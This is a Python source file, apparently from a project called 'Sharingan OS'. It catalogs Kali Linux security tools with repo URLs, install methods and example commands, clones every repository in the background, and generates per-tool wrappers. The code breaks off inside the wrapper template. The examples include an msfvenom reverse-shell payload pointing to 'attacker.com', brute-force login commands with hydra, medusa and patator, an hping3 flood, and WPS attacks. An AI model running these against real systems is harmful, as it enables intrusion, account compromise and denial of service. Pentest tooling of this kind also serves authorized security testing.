#!/usr/bin/env python3
"""
Sharingan OS - Complete Kali Tools Integration Framework
Framework complet pour l'intégration de tous les outils Kali Linux
Auteur: Ben Sambe
"""

import os
import sys
import subprocess
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field
from datetime import datetime
import json
import logging
import queue
import concurrent.futures

logger = logging.getLogger("sharingan.kali.framework")

@dataclass
class KaliToolConfig:
    """Configuration complète d'un outil Kali"""
    name: str
    category: str
    description: str
    command: str
    repo_url: str
    repo_type: str = "git"  # git, svn, hg, etc.
    install_method: str = "apt"  # apt, pip, source, manual
    package_name: str = ""
    requires_root: bool = False
    dependencies: List[str] = field(default_factory=list)
    env_vars: Dict[str, str] = field(default_factory=dict)
    config_files: List[str] = field(default_factory=list)
    wordlists: List[str] = field(default_factory=list)
    examples: List[str] = field(default_factory=list)
    security_notes: List[str] = field(default_factory=list)
    timeout: int = 300
    max_retries: int = 3
    parallel_safe: bool = True

@dataclass
class ToolExecutionResult:
    """Résultat d'exécution d'un outil"""
    tool_name: str
    success: bool
    returncode: int
    stdout: str
    stderr: str
    execution_time: float
    start_time: datetime
    end_time: datetime
    parsed_output: Optional[Dict] = None
    error_message: Optional[str] = None

class KaliToolsRegistry:
    """Registre complet des outils Kali"""

    def __init__(self):
        self.tools: Dict[str, KaliToolConfig] = {}
        self.categories: Dict[str, List[str]] = {}
        self._load_all_tools()

    def _load_all_tools(self):
        """Charge tous les outils Kali"""
        self._load_network_tools()
        self._load_web_tools()
        self._load_password_tools()
        self._load_wireless_tools()
        self._load_exploitation_tools()
        self._load_forensic_tools()
        self._load_enumeration_tools()
        self._load_social_tools()
        self._load_reverse_tools()
        self._load_post_exploit_tools()
        self._load_vuln_scanners()
        self._load_reporting_tools()
        self._load_monitoring_tools()

    def _load_network_tools(self):
        """Charge les outils réseau"""
        network_tools = {
            "nmap": KaliToolConfig(
                name="nmap",
                category="network",
                description="Network Mapper - Advanced port scanner",
                command="nmap",
                repo_url="https://github.com/nmap/nmap.git",
                install_method="apt",
                package_name="nmap",
                examples=[
                    "nmap -sV -p- target.com",
                    "nmap -A -T4 target.com",
                    "nmap --script=vuln target.com"
                ],
                security_notes=["Requires network access", "May trigger IDS"]
            ),
            "masscan": KaliToolConfig(
                name="masscan",
                category="network",
                description="Mass IP port scanner",
                command="masscan",
                repo_url="https://github.com/robertdavidgraham/masscan.git",
                install_method="apt",
                package_name="masscan",
                examples=[
                    "masscan -p1-65535 target.com --rate=1000",
                    "masscan -p80,443 target.com"
                ],
                security_notes=["Very fast scanning", "May overwhelm networks"]
            ),
            "netdiscover": KaliToolConfig(
                name="netdiscover",
                category="network",
                description="Network address discovery",
                command="netdiscover",
                repo_url="https://github.com/netdiscover-scanner/netdiscover.git",
                install_method="apt",
                package_name="netdiscover",
                examples=[
                    "netdiscover -r 192.168.1.0/24",
                    "netdiscover -p"
                ],
                security_notes=["ARP scanning", "Passive discovery available"]
            ),
            "arp-scan": KaliToolConfig(
                name="arp-scan",
                category="network",
                description="ARP network scanner",
                command="arp-scan",
                repo_url="https://github.com/royhills/arp-scan.git",
                install_method="apt",
                package_name="arp-scan",
                examples=[
                    "arp-scan --interface=eth0 192.168.1.0/24",
                    "arp-scan --localnet"
                ]
            ),
            "hping3": KaliToolConfig(
                name="hping3",
                category="network",
                description="TCP/IP packet assembler/analyzer",
                command="hping3",
                repo_url="https://github.com/antirez/hping.git",
                install_method="apt",
                package_name="hping3",
                examples=[
                    "hping3 --scan 1-1000 target.com",
                    "hping3 --flood target.com"
                ],
                security_notes=["Packet crafting tool", "Can be used for DoS"]
            )
        }

        for name, config in network_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_web_tools(self):
        """Charge les outils web"""
        web_tools = {
            "nikto": KaliToolConfig(
                name="nikto",
                category="web",
                description="Web server scanner",
                command="nikto",
                repo_url="https://github.com/sullo/nikto.git",
                install_method="apt",
                package_name="nikto",
                examples=[
                    "nikto -h http://target.com",
                    "nikto -h target.com -p 80,443"
                ]
            ),
            "dirb": KaliToolConfig(
                name="dirb",
                category="web",
                description="Web content scanner",
                command="dirb",
                repo_url="https://github.com/v0re/dirb.git",
                install_method="apt",
                package_name="dirb",
                wordlists=["/usr/share/wordlists/dirb/common.txt"],
                examples=[
                    "dirb http://target.com",
                    "dirb http://target.com /usr/share/wordlists/dirb/common.txt"
                ]
            ),
            "dirsearch": KaliToolConfig(
                name="dirsearch",
                category="web",
                description="Web path discovery",
                command="dirsearch",
                repo_url="https://github.com/maurosoria/dirsearch.git",
                install_method="pip",
                package_name="dirsearch",
                examples=[
                    "dirsearch -u http://target.com",
                    "dirsearch -u http://target.com -w /usr/share/wordlists/dirb/common.txt"
                ]
            ),
            "gobuster": KaliToolConfig(
                name="gobuster",
                category="web",
                description="Directory/file/dns busting tool",
                command="gobuster",
                repo_url="https://github.com/OJ/gobuster.git",
                install_method="apt",
                package_name="gobuster",
                examples=[
                    "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
                    "gobuster dns -d domain.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt"
                ]
            ),
            "ffuf": KaliToolConfig(
                name="ffuf",
                category="web",
                description="Fast web fuzzer",
                command="ffuf",
                repo_url="https://github.com/ffuf/ffuf.git",
                install_method="apt",
                package_name="ffuf",
                examples=[
                    "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt",
                    "ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200"
                ]
            ),
            "wpscan": KaliToolConfig(
                name="wpscan",
                category="web",
                description="WordPress vulnerability scanner",
                command="wpscan",
                repo_url="https://github.com/wpscanteam/wpscan.git",
                install_method="apt",
                package_name="wpscan",
                examples=[
                    "wpscan --url http://wordpress-site.com",
                    "wpscan --url http://wordpress-site.com --enumerate u"
                ]
            ),
            "whatweb": KaliToolConfig(
                name="whatweb",
                category="web",
                description="Web technology fingerprinting",
                command="whatweb",
                repo_url="https://github.com/urbanadventurer/WhatWeb.git",
                install_method="apt",
                package_name="whatweb",
                examples=[
                    "whatweb target.com",
                    "whatweb -v target.com"
                ]
            )
        }

        for name, config in web_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_password_tools(self):
        """Charge les outils de mot de passe"""
        password_tools = {
            "hashcat": KaliToolConfig(
                name="hashcat",
                category="password",
                description="Advanced password recovery",
                command="hashcat",
                repo_url="https://github.com/hashcat/hashcat.git",
                install_method="apt",
                package_name="hashcat",
                requires_root=True,
                examples=[
                    "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a",
                    "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt"
                ],
                security_notes=["GPU intensive", "Requires proper cooling"]
            ),
            "john": KaliToolConfig(
                name="john",
                category="password",
                description="John the Ripper password cracker",
                command="john",
                repo_url="https://github.com/openwall/john.git",
                install_method="apt",
                package_name="john",
                examples=[
                    "john hash.txt",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
                ]
            ),
            "hydra": KaliToolConfig(
                name="hydra",
                category="password",
                description="Network login cracker",
                command="hydra",
                repo_url="https://github.com/vanhauser-thc/thc-hydra.git",
                install_method="apt",
                package_name="hydra",
                examples=[
                    "hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \"/login:username=^USER^&password=^PASS^:F=invalid\"",
                    "hydra -l user -P passlist.txt ftp://target.com"
                ],
                security_notes=["Brute force tool", "May trigger account locks"]
            ),
            "medusa": KaliToolConfig(
                name="medusa",
                category="password",
                description="Modular login brute-forcer",
                command="medusa",
                repo_url="https://github.com/jmk-foofus/medusa.git",
                install_method="apt",
                package_name="medusa",
                examples=[
                    "medusa -h target.com -u admin -P passwords.txt -M http"
                ]
            ),
            "patator": KaliToolConfig(
                name="patator",
                category="password",
                description="Multi-purpose brute-forcer",
                command="patator",
                repo_url="https://github.com/lanjelot/patator.git",
                install_method="apt",
                package_name="patator",
                examples=[
                    "patator http_fuzz url=http://target.com/login method=POST body='user=admin&password=FILE0' 0=passwords.txt"
                ]
            ),
            "crunch": KaliToolConfig(
                name="crunch",
                category="password",
                description="Wordlist generator",
                command="crunch",
                repo_url="https://github.com/crunchsec/crunch.git",
                install_method="apt",
                package_name="crunch",
                examples=[
                    "crunch 8 8 -o wordlist.txt",
                    "crunch 6 6 abcDEF -o wordlist.txt"
                ]
            )
        }

        for name, config in password_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_wireless_tools(self):
        """Charge les outils sans fil"""
        wireless_tools = {
            "aircrack-ng": KaliToolConfig(
                name="aircrack-ng",
                category="wireless",
                description="Wireless network auditor",
                command="aircrack-ng",
                repo_url="https://github.com/aircrack-ng/aircrack-ng.git",
                install_method="apt",
                package_name="aircrack-ng",
                examples=[
                    "airodump-ng wlan0",
                    "aircrack-ng -w wordlist.cap capture.cap"
                ],
                security_notes=["Requires wireless card", "Monitor mode required"]
            ),
            "reaver": KaliToolConfig(
                name="reaver",
                category="wireless",
                description="WiFi Protected Setup attack tool",
                command="reaver",
                repo_url="https://github.com/t6x/reaver-wps-fork-t6x.git",
                install_method="apt",
                package_name="reaver",
                examples=[
                    "reaver -i wlan0 -b XX:XX:XX:XX:XX:XX -vv"
                ],
                security_notes=["WPS attack tool", "May be illegal"]
            ),
            "bully": KaliToolConfig(
                name="bully",
                category="wireless",
                description="WPS brute force attack tool",
                command="bully",
                repo_url="https://github.com/aanarchyy/bully.git",
                install_method="apt",
                package_name="bully",
                examples=[
                    "bully wlan0 -b XX:XX:XX:XX:XX:XX -c 1"
                ]
            )
        }

        for name, config in wireless_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_exploitation_tools(self):
        """Charge les outils d'exploitation"""
        exploitation_tools = {
            "metasploit": KaliToolConfig(
                name="metasploit",
                category="exploitation",
                description="Metasploit Framework",
                command="msfconsole",
                repo_url="https://github.com/rapid7/metasploit-framework.git",
                install_method="apt",
                package_name="metasploit-framework",
                examples=[
                    "msfconsole",
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe > payload.exe"
                ],
                security_notes=["Full exploitation framework", "Requires careful usage"]
            ),
            "sqlmap": KaliToolConfig(
                name="sqlmap",
                category="exploitation",
                description="SQL injection tool",
                command="sqlmap",
                repo_url="https://github.com/sqlmapproject/sqlmap.git",
                install_method="apt",
                package_name="sqlmap",
                examples=[
                    "sqlmap -u 'http://target.com/vuln.php?id=1'",
                    "sqlmap -u 'http://target.com/vuln.php?id=1' --dbs"
                ],
                security_notes=["SQL injection exploitation", "Database dumping capability"]
            ),
            "searchsploit": KaliToolConfig(
                name="searchsploit",
                category="exploitation",
                description="Exploit database search tool",
                command="searchsploit",
                repo_url="https://github.com/offensive-security/exploitdb.git",
                install_method="apt",
                package_name="exploitdb",
                examples=[
                    "searchsploit apache",
                    "searchsploit -x 12345"
                ]
            )
        }

        for name, config in exploitation_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_forensic_tools(self):
        """Charge les outils forensics"""
        forensic_tools = {
            "binwalk": KaliToolConfig(
                name="binwalk",
                category="forensic",
                description="Firmware analysis tool",
                command="binwalk",
                repo_url="https://github.com/ReFirmLabs/binwalk.git",
                install_method="apt",
                package_name="binwalk",
                examples=[
                    "binwalk firmware.bin",
                    "binwalk -e firmware.bin"
                ]
            ),
            "foremost": KaliToolConfig(
                name="foremost",
                category="forensic",
                description="File carving tool",
                command="foremost",
                repo_url="https://github.com/korczis/foremost.git",
                install_method="apt",
                package_name="foremost",
                examples=[
                    "foremost -i image.dd -o output/",
                    "foremost -i image.dd -t jpg,png,gif -o output/"
                ]
            ),
            "volatility": KaliToolConfig(
                name="volatility",
                category="forensic",
                description="Memory forensics framework",
                command="volatility",
                repo_url="https://github.com/volatilityfoundation/volatility3.git",
                install_method="apt",
                package_name="volatility",
                requires_root=True,
                examples=[
                    "volatility -f memory.dump imageinfo",
                    "volatility -f memory.dump --profile=Win7SP1x64 pslist"
                ]
            ),
            "autopsy": KaliToolConfig(
                name="autopsy",
                category="forensic",
                description="Digital forensics platform",
                command="autopsy",
                repo_url="https://github.com/sleuthkit/autopsy.git",
                install_method="apt",
                package_name="autopsy",
                examples=[
                    "autopsy"
                ]
            ),
            "scalpel": KaliToolConfig(
                name="scalpel",
                category="forensic",
                description="File carving tool",
                command="scalpel",
                repo_url="https://github.com/machn1k/scalpel.git",
                install_method="apt",
                package_name="scalpel",
                examples=[
                    "scalpel -c /etc/scalpel/scalpel.conf image.dd -o output/"
                ]
            )
        }

        for name, config in forensic_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_enumeration_tools(self):
        """Charge les outils d'énumération"""
        enumeration_tools = {
            "theharvester": KaliToolConfig(
                name="theharvester",
                category="enumeration",
                description="Email, domain and IP harvesting",
                command="theharvester",
                repo_url="https://github.com/laramies/theHarvester.git",
                install_method="apt",
                package_name="theharvester",
                examples=[
                    "theharvester -d domain.com -l 500 -b google",
                    "theharvester -d domain.com -b all"
                ]
            ),
            "dnsrecon": KaliToolConfig(
                name="dnsrecon",
                category="enumeration",
                description="DNS enumeration tool",
                command="dnsrecon",
                repo_url="https://github.com/darkoperator/dnsrecon.git",
                install_method="apt",
                package_name="dnsrecon",
                examples=[
                    "dnsrecon -d domain.com",
                    "dnsrecon -d domain.com -t axfr"
                ]
            ),
            "dnsenum": KaliToolConfig(
                name="dnsenum",
                category="enumeration",
                description="DNS enumeration tool",
                command="dnsenum",
                repo_url="https://github.com/fwaeytens/dnsenum.git",
                install_method="apt",
                package_name="dnsenum",
                examples=[
                    "dnsenum domain.com"
                ]
            ),
            "fierce": KaliToolConfig(
                name="fierce",
                category="enumeration",
                description="DNS reconnaissance tool",
                command="fierce",
                repo_url="https://github.com/mschwager/fierce.git",
                install_method="apt",
                package_name="fierce",
                examples=[
                    "fierce -dns domain.com"
                ]
            ),
            "recon-ng": KaliToolConfig(
                name="recon-ng",
                category="enumeration",
                description="Web reconnaissance framework",
                command="recon-ng",
                repo_url="https://github.com/lanmaster53/recon-ng.git",
                install_method="apt",
                package_name="recon-ng",
                examples=[
                    "recon-ng",
                    "recon-ng -w domain.com"
                ]
            )
        }

        for name, config in enumeration_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_social_tools(self):
        """Charge les outils d'ingénierie sociale"""
        social_tools = {
            "setoolkit": KaliToolConfig(
                name="setoolkit",
                category="social",
                description="Social-Engineer Toolkit",
                command="setoolkit",
                repo_url="https://github.com/trustedsec/social-engineer-toolkit.git",
                install_method="apt",
                package_name="set",
                examples=[
                    "setoolkit"
                ],
                security_notes=["Social engineering framework", "Requires careful usage"]
            ),
            "king-phisher": KaliToolConfig(
                name="king-phisher",
                category="social",
                description="Phishing campaign toolkit",
                command="king-phisher",
                repo_url="https://github.com/rsmusllp/king-phisher.git",
                install_method="apt",
                package_name="king-phisher",
                examples=[
                    "king-phisher"
                ]
            ),
            "gophish": KaliToolConfig(
                name="gophish",
                category="social",
                description="Open-source phishing toolkit",
                command="gophish",
                repo_url="https://github.com/gophish/gophish.git",
                install_method="manual",
                examples=[
                    "./gophish"
                ]
            )
        }

        for name, config in social_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_reverse_tools(self):
        """Charge les outils de reverse engineering"""
        reverse_tools = {
            "radare2": KaliToolConfig(
                name="radare2",
                category="reverse",
                description="Reverse engineering framework",
                command="r2",
                repo_url="https://github.com/radareorg/radare2.git",
                install_method="apt",
                package_name="radare2",
                examples=[
                    "r2 binary",
                    "r2 -A binary"
                ]
            ),
            "gdb": KaliToolConfig(
                name="gdb",
                category="reverse",
                description="GNU Debugger",
                command="gdb",
                repo_url="https://github.com/bminor/binutils-gdb.git",
                install_method="apt",
                package_name="gdb",
                examples=[
                    "gdb binary",
                    "gdb -batch -ex 'file binary' -ex 'disassemble main'"
                ]
            ),
            "objdump": KaliToolConfig(
                name="objdump",
                category="reverse",
                description="Display information from object files",
                command="objdump",
                repo_url="https://github.com/bminor/binutils-gdb.git",
                install_method="apt",
                package_name="binutils",
                examples=[
                    "objdump -d binary",
                    "objdump -x binary"
                ]
            ),
            "strings": KaliToolConfig(
                name="strings",
                category="reverse",
                description="Print the strings of printable characters in files",
                command="strings",
                repo_url="https://github.com/bminor/binutils-gdb.git",
                install_method="apt",
                package_name="binutils",
                examples=[
                    "strings binary",
                    "strings -a binary"
                ]
            ),
            "ltrace": KaliToolConfig(
                name="ltrace",
                category="reverse",
                description="Library call tracer",
                command="ltrace",
                repo_url="https://github.com/dkogan/ltrace.git",
                install_method="apt",
                package_name="ltrace",
                examples=[
                    "ltrace ./binary",
                    "ltrace -c ./binary"
                ]
            ),
            "strace": KaliToolConfig(
                name="strace",
                category="reverse",
                description="System call tracer",
                command="strace",
                repo_url="https://github.com/strace/strace.git",
                install_method="apt",
                package_name="strace",
                examples=[
                    "strace ./binary",
                    "strace -c ./binary"
                ]
            )
        }

        for name, config in reverse_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_post_exploit_tools(self):
        """Charge les outils post-exploitation"""
        post_exploit_tools = {
            "empire": KaliToolConfig(
                name="empire",
                category="post_exploit",
                description="Post-exploitation framework",
                command="empire",
                repo_url="https://github.com/EmpireProject/Empire.git",
                install_method="manual",
                examples=[
                    "./empire"
                ],
                security_notes=["Post-exploitation framework", "Requires careful usage"]
            ),
            "covenant": KaliToolConfig(
                name="covenant",
                category="post_exploit",
                description="C2 framework",
                command="covenant",
                repo_url="https://github.com/cobbr/Covenant.git",
                install_method="manual",
                examples=[
                    "dotnet run"
                ]
            ),
            "pupy": KaliToolConfig(
                name="pupy",
                category="post_exploit",
                description="Cross-platform remote administration tool",
                command="pupy",
                repo_url="https://github.com/n1nj4sec/pupy.git",
                install_method="manual",
                examples=[
                    "./pupy/pupysh.py"
                ]
            ),
            "quack": KaliToolConfig(
                name="quack",
                category="post_exploit",
                description="Post-exploitation toolkit",
                command="quack",
                repo_url="https://github.com/k0st/Quack.git",
                install_method="manual",
                examples=[
                    "./quack.py"
                ]
            )
        }

        for name, config in post_exploit_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_vuln_scanners(self):
        """Charge les scanners de vulnérabilités"""
        vuln_scanners = {
            "openvas": KaliToolConfig(
                name="openvas",
                category="vulnerability",
                description="Open Vulnerability Assessment System",
                command="openvas-start",
                repo_url="https://github.com/greenbone/openvas-scanner.git",
                install_method="apt",
                package_name="openvas",
                requires_root=True,
                examples=[
                    "openvas-start",
                    "openvas-stop"
                ]
            ),
            "nessus": KaliToolConfig(
                name="nessus",
                category="vulnerability",
                description="Nessus vulnerability scanner",
                command="nessus",
                repo_url="",
                install_method="manual",
                examples=[
                    "/opt/nessus/sbin/nessus-service"
                ],
                security_notes=["Commercial tool", "Requires license"]
            ),
            "nexpose": KaliToolConfig(
                name="nexpose",
                category="vulnerability",
                description="Rapid7 Nexpose vulnerability scanner",
                command="nsc",
                repo_url="",
                install_method="manual",
                examples=[
                    "nsc"
                ],
                security_notes=["Commercial tool", "Requires license"]
            ),
            "qualysguard": KaliToolConfig(
                name="qualysguard",
                category="vulnerability",
                description="QualysGuard vulnerability scanner",
                command="qualys",
                repo_url="",
                install_method="manual",
                examples=[
                    "qualys"
                ],
                security_notes=["Commercial tool", "Cloud-based"]
            )
        }

        for name, config in vuln_scanners.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_reporting_tools(self):
        """Charge les outils de reporting"""
        reporting_tools = {
            "dradis": KaliToolConfig(
                name="dradis",
                category="reporting",
                description="Collaboration framework for security teams",
                command="dradis",
                repo_url="https://github.com/dradis/dradis-ce.git",
                install_method="manual",
                examples=[
                    "rails server"
                ]
            ),
            "faraday": KaliToolConfig(
                name="faraday",
                category="reporting",
                description="Collaborative penetration test and vulnerability management",
                command="faraday",
                repo_url="https://github.com/infobyte/faraday.git",
                install_method="manual",
                examples=[
                    "./faraday.py"
                ]
            ),
            "keepnote": KaliToolConfig(
                name="keepnote",
                category="reporting",
                description="Note taking and organization",
                command="keepnote",
                repo_url="https://github.com/mchua/keepnote.git",
                install_method="apt",
                package_name="keepnote",
                examples=[
                    "keepnote"
                ]
            ),
            "cherrytree": KaliToolConfig(
                name="cherrytree",
                category="reporting",
                description="Hierarchical note taking application",
                command="cherrytree",
                repo_url="https://github.com/giuspen/cherrytree.git",
                install_method="apt",
                package_name="cherrytree",
                examples=[
                    "cherrytree"
                ]
            )
        }

        for name, config in reporting_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def _load_monitoring_tools(self):
        """Charge les outils de monitoring"""
        monitoring_tools = {
            "wireshark": KaliToolConfig(
                name="wireshark",
                category="monitoring",
                description="Network protocol analyzer",
                command="wireshark",
                repo_url="https://github.com/wireshark/wireshark.git",
                install_method="apt",
                package_name="wireshark",
                examples=[
                    "wireshark",
                    "tshark -i eth0"
                ]
            ),
            "tcpdump": KaliToolConfig(
                name="tcpdump",
                category="monitoring",
                description="Command-line packet analyzer",
                command="tcpdump",
                repo_url="https://github.com/the-tcpdump-group/tcpdump.git",
                install_method="apt",
                package_name="tcpdump",
                examples=[
                    "tcpdump -i eth0",
                    "tcpdump -i eth0 -w capture.pcap"
                ]
            ),
            "ntopng": KaliToolConfig(
                name="ntopng",
                category="monitoring",
                description="Web-based network traffic monitoring",
                command="ntopng",
                repo_url="https://github.com/ntop/ntopng.git",
                install_method="apt",
                package_name="ntopng",
                examples=[
                    "ntopng"
                ]
            ),
            "snort": KaliToolConfig(
                name="snort",
                category="monitoring",
                description="Network intrusion detection system",
                command="snort",
                repo_url="https://github.com/snort3/snort3.git",
                install_method="apt",
                package_name="snort",
                examples=[
                    "snort -c /etc/snort/snort.conf -i eth0"
                ]
            ),
            "suricata": KaliToolConfig(
                name="suricata",
                category="monitoring",
                description="Network IDS, IPS and NSM engine",
                command="suricata",
                repo_url="https://github.com/OISF/suricata.git",
                install_method="apt",
                package_name="suricata",
                examples=[
                    "suricata -c /etc/suricata/suricata.yaml -i eth0"
                ]
            )
        }

        for name, config in monitoring_tools.items():
            self.tools[name] = config
            if config.category not in self.categories:
                self.categories[config.category] = []
            self.categories[config.category].append(name)

    def get_tool(self, name: str) -> Optional[KaliToolConfig]:
        """Récupère la configuration d'un outil"""
        return self.tools.get(name)

    def get_tools_by_category(self, category: str) -> List[str]:
        """Récupère les outils d'une catégorie"""
        return self.categories.get(category, [])

    def get_all_tools(self) -> Dict[str, KaliToolConfig]:
        """Récupère tous les outils"""
        return self.tools.copy()

    def get_categories(self) -> Dict[str, List[str]]:
        """Récupère toutes les catégories"""
        return self.categories.copy()

class RepositoryCloner:
    """Cloneur de repositories en arrière-plan"""

    def __init__(self, base_dir: Path):
        self.base_dir = base_dir / "kali_repos"
        self.base_dir.mkdir(parents=True, exist_ok=True)
        self.download_queue = queue.Queue()
        self.results = {}
        self.active_downloads = set()
        self.max_concurrent = 3  # Nombre maximum de téléchargements simultanés

        # Démarrer le thread de traitement
        self.worker_thread = threading.Thread(target=self._process_queue, daemon=True)
        self.worker_thread.start()

    def add_repository(self, name: str, url: str, repo_type: str = "git"):
        """Ajoute un repository à la queue de téléchargement"""
        if name not in self.active_downloads and name not in self.results:
            self.download_queue.put({
                "name": name,
                "url": url,
                "type": repo_type
            })
            logger.info(f"Added {name} to download queue")

    def _process_queue(self):
        """Traite la queue de téléchargement"""
        while True:
            try:
                # Attendre un élément dans la queue
                if self.download_queue.empty() and not self.active_downloads:
                    time.sleep(1)
                    continue

                # Limiter le nombre de téléchargements simultanés
                if len(self.active_downloads) >= self.max_concurrent:
                    time.sleep(0.5)
                    continue

                try:
                    repo_info = self.download_queue.get_nowait()
                except queue.Empty:
                    continue

                repo_name = repo_info["name"]
                repo_url = repo_info["url"]
                repo_type = repo_info["type"]

                self.active_downloads.add(repo_name)

                # Lancer le téléchargement dans un thread séparé
                download_thread = threading.Thread(
                    target=self._clone_repository,
                    args=(repo_name, repo_url, repo_type),
                    daemon=True
                )
                download_thread.start()

            except Exception as e:
                logger.error(f"Error in queue processing: {e}")
                time.sleep(1)

    def _clone_repository(self, name: str, url: str, repo_type: str):
        """Clone un repository"""
        try:
            repo_dir = self.base_dir / name
            repo_dir.mkdir(exist_ok=True)

            start_time = time.time()

            if repo_type == "git":
                cmd = ["git", "clone", "--depth", "1", url, str(repo_dir)]
            elif repo_type == "svn":
                cmd = ["svn", "checkout", url, str(repo_dir)]
            elif repo_type == "hg":
                cmd = ["hg", "clone", url, str(repo_dir)]
            else:
                raise ValueError(f"Unsupported repo type: {repo_type}")

            logger.info(f"Cloning {name} from {url}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600  # 10 minutes timeout
            )

            end_time = time.time()
            duration = end_time - start_time

            if result.returncode == 0:
                self.results[name] = {
                    "status": "success",
                    "path": str(repo_dir),
                    "duration": duration,
                    "size": self._get_dir_size(repo_dir)
                }
                logger.info(f"Successfully cloned {name} in {duration:.1f}s")
            else:
                self.results[name] = {
                    "status": "failed",
                    "error": result.stderr,
                    "duration": duration
                }
                logger.error(f"Failed to clone {name}: {result.stderr}")

        except subprocess.TimeoutExpired:
            self.results[name] = {
                "status": "timeout",
                "error": "Clone timeout"
            }
            logger.error(f"Clone timeout for {name}")
        except Exception as e:
            self.results[name] = {
                "status": "error",
                "error": str(e)
            }
            logger.error(f"Error cloning {name}: {e}")
        finally:
            self.active_downloads.discard(name)

    def _get_dir_size(self, path: Path) -> int:
        """Calcule la taille d'un répertoire"""
        total_size = 0
        try:
            for file_path in path.rglob('*'):
                if file_path.is_file():
                    total_size += file_path.stat().st_size
        except:
            pass
        return total_size

    def get_status(self) -> Dict[str, Any]:
        """Retourne le statut des téléchargements"""
        return {
            "active_downloads": list(self.active_downloads),
            "completed": len(self.results),
            "queue_size": self.download_queue.qsize(),
            "results": self.results.copy()
        }

    def wait_for_completion(self, timeout: int = 3600):
        """Attend la fin de tous les téléchargements"""
        start_time = time.time()
        while (self.active_downloads or not self.download_queue.empty()) and (time.time() - start_time) < timeout:
            time.sleep(1)

class KaliToolsManager:
    """Gestionnaire principal des outils Kali"""

    def __init__(self):
        self.registry = KaliToolsRegistry()
        self.base_dir = Path(__file__).parent
        self.repos_dir = self.base_dir / "kali_repos"
        self.wrappers_dir = self.base_dir / "wrappers"
        self.logs_dir = self.base_dir / "logs"

        # Créer les répertoires
        for dir_path in [self.repos_dir, self.wrappers_dir, self.logs_dir]:
            dir_path.mkdir(parents=True, exist_ok=True)

        # Initialiser le cloneur
        self.cloner = RepositoryCloner(self.base_dir)

        # Démarrer les téléchargements en arrière-plan
        self._start_background_cloning()

    def _start_background_cloning(self):
        """Démarre le clonage en arrière-plan de tous les repos"""
        logger.info("Starting background repository cloning...")

        for tool_name, tool_config in self.registry.get_all_tools().items():
            if tool_config.repo_url:
                self.cloner.add_repository(
                    tool_name,
                    tool_config.repo_url,
                    tool_config.repo_type
                )

        logger.info("All repositories added to download queue")

    def create_wrapper(self, tool_name: str) -> Optional[str]:
        """Crée un wrapper Python pour un outil Kali"""
        tool_config = self.registry.get_tool(tool_name)
        if not tool_config:
            return None

        wrapper_path = self.wrappers_dir / f"{tool_name}_wrapper.py"

        # Générer le code du wrapper
        wrapper_code = self._generate_wrapper_code(tool_config)
        wrapper_path.write_text(wrapper_code)
        wrapper_path.chmod(0o755)

        logger.info(f"Created wrapper for {tool_name}: {wrapper_path}")
        return str(wrapper_path)

    def _generate_wrapper_code(self, tool_config: KaliToolConfig) -> str:
        """Génère le code Python pour un wrapper d'outil"""
        examples_str = "\n".join(f'        "{ex}",' for ex in tool_config.examples)

        return f'''#!/usr/bin/env python3
"""
Sharingan OS - Kali Tool Wrapper: {tool_config.name}
{tool_config.description}

Generated automatically by KaliToolsManager
"""

import subprocess
import sys
import os
import time
import json
from pathlib import Path
from typing import List, Dict, Optional, Any
from datetime import datetime

# Configuration de l'outil
TOOL_NAME = "{tool_config.name}"
TOOL_COMMAND = "{tool_config.command}"
TOOL_DESCRIPTION = "{tool_config.description}"
REQUIRES_ROOT = {tool_config.requires_root}
TIMEOUT = {tool_config.timeout}
MAX_RETRIES = {tool_config.max_retries}

# Exemples d'utilisation
EXAMPLES = [
{examples_str}
]

class {tool_config.name.title()}Wrapper:
    """Wrapper Python pour {tool_config.name}"""

    def __init__(self):
        self.command = TOOL_COMMAND
        self.name = TOOL_NAME
        self.description = TOOL_DESCRIPTION
        self.requires_root = REQUIRES_ROOT
        self.timeout = TIMEOUT
        self.max_retries = MAX_RETRIES

    def check_installation(self) -> bool:
        """Vérifie si l'outil est installé"""
        try:
            result = subprocess.run(
                ["which", self.command],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except:
            return False

    def run(self, args: List[str] = None, **kwargs) -> Dict[str, Any]:
        """
        Exécute l'outil avec les arguments fournis

        Args:
            args: Liste d'arguments
            **kwargs: Options supplémentaires
                - timeout: Timeout personnalisé
                - retries: Nombre de tentatives
                - background: Exécution en arrière-plan

        Returns:
